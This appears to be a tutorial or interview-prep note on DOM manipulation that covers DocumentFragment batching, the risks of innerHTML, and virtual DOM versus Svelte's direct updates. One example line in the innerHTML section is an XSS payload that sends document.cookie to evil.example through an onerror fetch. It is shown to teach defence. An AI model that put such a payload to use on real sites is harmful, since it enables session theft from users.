# DOM manipulation

> **In one line:** Touching the DOM is the slow part of the page, so batch your changes (for example with a `DocumentFragment`), avoid `innerHTML` with user data because it can run attacker code, and remember that Svelte skips the virtual DOM and updates exactly the nodes that changed.

## Key points
- A [`DocumentFragment`](https://developer.mozilla.org/en-US/docs/Web/API/DocumentFragment) is a light container that is not in the page. You build many nodes inside it, then append it once. The page sees one insert instead of hundreds.
- [`innerHTML`](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML) parses a string as HTML. With user data this is an **XSS** risk (cross-site scripting: attacker code running in your page). It also destroys and rebuilds child nodes, so you lose event listeners, focus and input values.
- Safer options: `textContent` for text, `createElement` + `append` for structure, or a sanitizer like DOMPurify if you really must insert HTML.
- **Virtual DOM** (React, Vue): the UI is rebuilt as a JS object tree on each change, compared (diffed) with the old tree, and only the differences are written to the real DOM.
- **Direct updates** (Svelte, Solid): the compiler knows which DOM node depends on which variable, so a change updates that node directly. No tree to build or diff.

## Example
Rendering 500 watchlist rows:

```js
const list = document.querySelector('#watchlist');
const stocks = [{ symbol: 'AAPL', price: 227.5 } /* ...500 items */];

// SLOW-ish: 500 separate inserts into the live page
for (const s of stocks) {
  const li = document.createElement('li');
  li.textContent = `${s.symbol}: ${s.price}`;
  list.appendChild(li);
}

// BETTER: build off-page, insert once
const frag = document.createDocumentFragment();
for (const s of stocks) {
  const li = document.createElement('li');
  li.textContent = `${s.symbol}: ${s.price}`; // textContent never runs HTML
  frag.appendChild(li);
}
list.appendChild(frag); // one insert; the fragment is now empty

// Modern short version: append takes many nodes at once
list.replaceChildren(...stocks.map((s) => {
  const li = document.createElement('li');
  li.textContent = `${s.symbol}: ${s.price}`;
  return li;
}));
```

Why `innerHTML` is risky:

```js
const note = '<img src=x onerror="fetch(`https://evil.example/?c=${document.cookie}`)">';

el.innerHTML = note;   // DANGER: the onerror runs, cookies are sent away
el.textContent = note; // SAFE: shown as plain text
```

In Svelte the same rule applies: `{text}` is escaped (safe), `{@html text}` is raw HTML (only for trusted or sanitized content).

```svelte
<script>
  let { stocks } = $props();
</script>

<ul>
  {#each stocks as s (s.symbol)}
    <!-- When s.price changes, Svelte updates only this one text node -->
    <li>{s.symbol}: {s.price}</li>
  {/each}
</ul>
```

## When to use it
- Use `DocumentFragment` or `replaceChildren` in vanilla JS when inserting lists: search results, order history, an options chain.
- In a framework app you rarely touch the DOM. You do it for third-party widgets (a charting library), focus management, or measurements.
- Never put API or user text into `innerHTML` or `{@html}` in a fintech app; a stolen session can move money.

## Likely questions
### Why use a DocumentFragment?
It lets you build many nodes off-page and insert them in one operation. Since the fragment is not in the live document, adding nodes to it causes no style or layout work. When you append the fragment, its children move into the page and the fragment becomes empty. Note that modern browsers already batch layout until the next frame, so the big win is when you would otherwise mix reads and writes; `append(...nodes)` gives the same benefit.

### What are the risks of innerHTML?
The biggest one is XSS: if the string contains user data, tags like `<img onerror>` can run JS. (`<script>` tags inserted via innerHTML do not run, but event handler attributes do.) It also throws away the old child nodes, so listeners, focus, and typed input are lost, and it is slower for small updates because the browser re-parses HTML. Use `textContent` or build nodes, or sanitize with DOMPurify.

### Virtual DOM vs direct DOM updates: which is faster?
Neither is magic. The virtual DOM makes it easy to write "re-render everything" code and still touch the real DOM only where needed, but the diffing itself costs CPU and memory. Svelte compiles your components so a state change runs code like `text.data = price` directly, with no diff. For a page with hundreds of prices ticking every second, direct updates usually do less work. Hand-written, careful DOM code can be fastest of all but is hard to maintain.

### What is the difference between textContent, innerText and innerHTML?
`textContent` gets or sets raw text of all nodes, and is fast and safe. `innerText` respects CSS (skips hidden text), so reading it triggers layout. `innerHTML` reads or writes HTML markup and is the risky one.

## Common mistakes
- Using `el.innerHTML += '<li>..</li>'` in a loop. It re-parses the whole list each time and kills existing listeners.
- Forgetting that a fragment is empty after you append it; you cannot append it twice.
- Thinking virtual DOM means "no DOM work". It still writes to the real DOM; it only reduces how much.

## Resources
- [MDN: DocumentFragment](https://developer.mozilla.org/en-US/docs/Web/API/DocumentFragment) - API and behaviour on append
- [MDN: innerHTML security considerations](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML) - why it can run attacker code
- [javascript.info: Modifying the document](https://javascript.info/modifying-document) - createElement, append, fragments
- [OWASP: XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) - safe sinks and sanitizing
